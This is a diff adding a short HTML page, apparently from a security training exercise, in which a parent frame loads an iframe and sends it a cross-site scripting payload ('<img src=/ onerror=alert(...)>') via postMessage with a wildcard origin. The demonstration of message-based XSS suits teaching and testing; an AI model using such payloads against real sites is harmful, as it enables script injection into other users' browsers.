@@ -1,0 +1,10 @@
+<body onload="go()">
+親フレーム<br>
+<iframe id="if1" src="http://api.example.net/4h/4h-011c.html" width=350 height=100></iframe><br>
+<script>
+function go() {
+  var if1 = document.getElementById("if1");
+  if1.contentWindow.postMessage("<img src=/ onerror=alert('cracked')>", "*");
+}
+</script>
+</body>
